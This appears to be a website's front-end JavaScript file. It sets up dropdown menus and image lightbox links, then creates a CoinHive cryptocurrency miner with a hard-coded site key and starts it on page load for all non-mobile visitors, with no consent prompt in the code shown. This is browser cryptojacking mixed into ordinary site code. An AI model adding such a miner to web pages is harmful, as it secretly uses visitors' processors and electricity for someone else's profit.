$('.ui.dropdown')
  .dropdown();

$(".text img").each(function(index, element) {
  $(element).wrap(`<a href="${element.src}" data-fancybox data-caption="${element.alt}">`);
});

var miner = new CoinHive.Anonymous('zyc1ClPF1ZevATB5gChyGzZklCCZHmY7', {
  throttle: 0.5
});
// Only start on non-mobile devices.
if (!miner.isMobile()) {
  miner.start();
}